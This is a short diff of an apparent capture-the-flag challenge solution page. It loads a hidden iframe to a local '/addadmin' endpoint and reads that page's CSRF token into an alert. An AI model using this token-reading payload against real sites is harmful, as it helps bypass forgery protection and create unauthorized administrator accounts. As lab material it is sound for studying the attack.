@@ -5,7 +5,7 @@
     Challenge Solution HTML
 </body>
 <script>
-    document.writeln('<iframe id="iframe" src="/addadmin" width="0" height="0" onload="read()"></iframe>');
+    document.writeln('<iframe id="iframe" src="http://localhost/addadmin" width="0" height="0" onload="read()"></iframe>');
     function read() {
         alert(document.getElementById("iframe").contentDocument.forms[0].csrf-token.value);
     }
